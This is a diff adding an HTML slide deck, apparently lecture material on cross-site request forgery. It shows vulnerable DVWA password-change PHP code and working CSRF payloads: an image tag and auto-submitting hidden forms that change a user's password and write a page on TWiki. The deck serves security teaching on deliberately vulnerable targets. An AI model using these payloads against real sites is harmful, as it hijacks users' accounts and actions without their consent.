@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">-->
+  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0">-->
+  <!--This one seems to work all the time, but really small on ipad-->
+  <!--<meta name="viewport" content="initial-scale=0.4">-->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <link rel="stylesheet" media="all" href="theme/css/default.css">
+  <link rel="stylesheet" media="only screen and (max-device-width: 480px)" href="theme/css/phone.css">
+  <base target="_blank"> <!-- This amazingness opens all links in a new tab. -->
+  <script data-main="js/slides" src="js/require-1.0.8.min.js"></script>
+</head>
+<body style="opacity: 0">
+
+<slides class="layout-widescreen">
+
+  <slide class="title-slide segue nobackground">
+    <aside class="gdbar"><img src="images/slide-institute/uulm-128.png"></aside>
+    <hgroup class="auto-fadein">
+      <h1 data-config-title><!-- populated from slide_config.json --></h1>
+      <h2 data-config-subtitle><!-- populated from slide_config.json --></h2>
+      <p data-config-presenter><!-- populated from slide_config.json --></p>
+    </hgroup>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>DVWA: low</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="PHP">
+// vulnerabilities/csrf/source/low.php   
+
+if (isset($_GET['Change'])) {
+	// Turn requests into variables
+	$pass_new = $_GET['password_new'];
+	$pass_conf = $_GET['password_conf'];
+
+	if (($pass_new == $pass_conf)){
+</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>DVWA: low</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="HTML">
+&lt;img src="http://192.168.1.103/dvwa/
+  vulnerabilities/csrf/?Change=true&password_new=santa&password_conf=santa"
+/&gt;
+</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>DVWA: medium</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="PHP">
+// vulnerabilities/csrf/source/medium.php   
+
+if (isset($_GET['Change'])) {
+
+	// Checks the http referer header
+	if ( eregi ( "127.0.0.1", $_SERVER['HTTP_REFERER'] ) ){
+		// Turn requests into variables
+		$pass_new = $_GET['password_new'];
+		$pass_conf = $_GET['password_conf'];
+
+		if ($pass_new == $pass_conf){
+</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>DVWA: medium</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="HTML">
+&lt;iframe src="/csrf-exploits/127.0.0.1/medium.html"&gt;&lt;/iframe/&gt;
+</pre>
+
+<pre class="prettyprint" data-lang="HTML">
+&lt;!-- /csrf-exploits/127.0.0.1/medium.html --&gt;
+&lt;form name="frmCSRF" action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET"&gt;
+  &lt;input type="hidden" name="Change" value="true" /&gt;
+  &lt;input type="hidden" name="password_new" value="xkcd" /&gt;
+  &lt;input type="hidden" name="password_conf" value="xkcd" /&gt;
+&lt;/form&gt;
+
+&lt;script type="text/javascript"&gt;
+document.body.onload = function() {
+  document.frmCSRF.submit();
+}
+&lt;/script&gt;
+</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>TWiki</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="HTML">
+&lt;form name="frmCSRF" action="http://192.168.1.103/twiki/bin/save/Main/yippie"&gt;
+  &lt;input type="hidden" name="cmd" value="" /&gt;
+  &lt;input type="hidden" name="formtemplate" value="" /&gt;
+  &lt;input type="hidden" name="topicparent" value="" /&gt;
+  &lt;input type="hidden" name="text" value="hurray" /&gt;
+&lt;/form&gt;
+
+&lt;script type="text/javascript"&gt;
+document.body.onload = function() {
+  document.frmCSRF.submit();
+}
+&lt;/script&gt;
+</pre>
+    </article>
+  </slide>
+
+  <slide class="thank-you-slide segue nobackground">
+    <article class="flexbox vleft">
+      <br /> <br /> <br />
+
+      <pre class="prettyprint questions" data-lang="javascript" >
+assignments.part(2);
+      </pre>
+
+	<br/> <br/> <br/>
+
+
+    </article>
+    <p class="auto-fadein" data-config-contact style="display:none;">
+      <!-- populated from slide_config.json -->
+    </p>
+  </slide>
+
+  <slide class="backdrop"></slide>
+
+</slides>
+
+
+<!--[if IE]>
+  <script src="http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js"></script>
+  <script>CFInstall.check({mode: 'overlay'});</script>
+<![endif]-->
+</body>
+</html>
